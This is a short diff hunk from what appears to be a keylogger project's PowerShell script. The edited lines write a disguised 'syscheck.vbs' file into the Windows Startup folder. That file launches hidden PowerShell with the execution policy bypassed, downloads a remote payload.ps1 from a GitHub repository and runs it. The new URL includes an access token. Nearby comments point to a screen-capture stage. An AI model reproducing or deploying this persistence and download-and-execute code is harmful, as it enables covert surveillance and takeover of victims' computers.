@@ -68,7 +68,7 @@ Start-Job -ScriptBlock {
 $wscriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\syscheck.vbs"  
 @"  
 Set objShell = CreateObject("WScript.Shell")  
-objShell.Run "powershell -Exec Bypass -Window Hidden -C `"IEX (New-Object Net.WebClient).DownloadString('https://github.com/thedunces/CherryCreek-Key-Logger/blob/main/payload.ps1')`"", 0  
+objShell.Run "powershell -Exec Bypass -Window Hidden -C `"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/thedunces/CherryCreek-Key-Logger/refs/heads/main/payload.ps1?token=GHSAT0AAAAAADBJ5M4SSOQYWXNGWR6AVVSUZ7HGIBQ')`"", 0  
 "@ | Out-File $wscriptPath -Encoding ASCII  
 
 # Stage 5: Lightweight Screen Capture (JPEG2000 + Chunking)  
